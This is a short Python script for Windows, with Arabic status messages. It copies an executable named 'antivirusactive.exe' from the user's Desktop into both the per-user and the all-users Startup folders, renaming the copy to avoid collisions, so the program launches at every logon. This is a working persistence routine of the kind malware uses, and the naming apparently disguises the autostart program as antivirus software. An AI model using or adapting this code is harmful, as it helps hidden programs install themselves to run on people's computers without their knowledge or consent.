import os
import shutil
import ctypes

def app():
    
    username = os.getlogin()

    def get_unique_path(target_folder, file_name):
        base_name, extension = os.path.splitext(file_name)
        counter = 1
        new_file_name = file_name
        new_path = os.path.join(target_folder, new_file_name)
        
        while os.path.exists(new_path):
            new_file_name = f"{base_name}_{counter}{extension}"
            new_path = os.path.join(target_folder, new_file_name)
            counter += 1
        
        return new_path

    def secure_copy_with_rename(file_path):
        paths = [
            os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup"),
            os.path.join(os.getenv('PROGRAMDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
        ]
        
        if not os.path.isfile(file_path):
            ctypes.windll.user32.MessageBoxW(0, "الملف الأصلي غير موجود أو المسار غير دقيق!", "خطأ", 0x10)
            return

        original_name = os.path.basename(file_path)
        success_count = 0

        for folder in paths:
            if not os.path.exists(folder): continue
            try:
                final_destination = get_unique_path(folder, original_name)
                shutil.copy2(file_path, final_destination)
                success_count += 1
            except PermissionError:
                print(f"لا توجد صلاحيات للنسخ في: {folder}")
            except Exception as e:
                print(f"خطأ غير متوقع: {e}")

        if success_count == 0:
            ctypes.windll.user32.MessageBoxW(0, "تعذر نسخ الملف في مسارات بدء التشغيل.", "تنبيه", 0x10)
        else:
            print(f"تم النسخ بنجاح إلى {success_count} موقع.")

    target_exe = os.path.join(os.path.expanduser("~"), "Desktop", "antivirusactive.exe")

    secure_copy_with_rename(target_exe)


